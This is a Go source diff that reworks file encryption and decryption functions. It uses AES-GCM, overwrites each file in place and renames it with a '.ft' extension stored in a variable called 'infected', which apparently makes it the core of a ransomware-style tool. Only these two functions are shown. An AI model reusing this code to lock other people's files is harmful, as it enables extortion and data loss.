@@ -5,51 +5,46 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"fmt"
+	"strings"
 	"io"
 	"os"
 )
 
+// Generates AES in GCM mode + random nonce then renames the file and overwrites it with the encrypted data
 func EncryptFile(key []byte, filePath string) error {
-	// Read file to encrypt
 	plaintext, err := os.ReadFile(filePath)
 	if err != nil {
 		return err
 	}
-	dest := filePath + ".ft"
-	os.Rename(filePath, dest)
 
-	// Create AES cipher
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return err
 	}
-
-	// Create GCM mode
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
 		return err
 	}
 
-	// Generate random nonce
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
 		return err
 	}
 
-	// Encrypt
 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
 
-	// Write nonce + ciphertext to output file
-	return os.WriteFile(dest, ciphertext, 0644)
+	infected := filePath + ".ft"
+	os.Rename(filePath, infected )
+
+	return os.WriteFile(infected , ciphertext, 0644)
 }
 
-func DecryptFile(key []byte, inputPath, outputPath string) error {
-	ciphertext, err := os.ReadFile(inputPath)
+func DecryptFile(key []byte, filePath string) error {
+	ciphertext, err := os.ReadFile(filePath)
 	if err != nil {
 		return err
 	}
 
-	// Create AES cipher
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return err
@@ -68,11 +63,12 @@ func DecryptFile(key []byte, inputPath, outputPath string) error {
 	nonce := ciphertext[:nonceSize]
 	data := ciphertext[nonceSize:]
 
-	// Decrypt
 	plaintext, err := gcm.Open(nil, nonce, data, nil)
 	if err != nil {
 		return err
 	}
+	cleaned := strings.TrimSuffix(filePath, ".ft")
+	os.Rename(filePath, cleaned)
 
-	return os.WriteFile(outputPath, plaintext, 0644)
+	return os.WriteFile(cleaned, plaintext, 0644)
 }
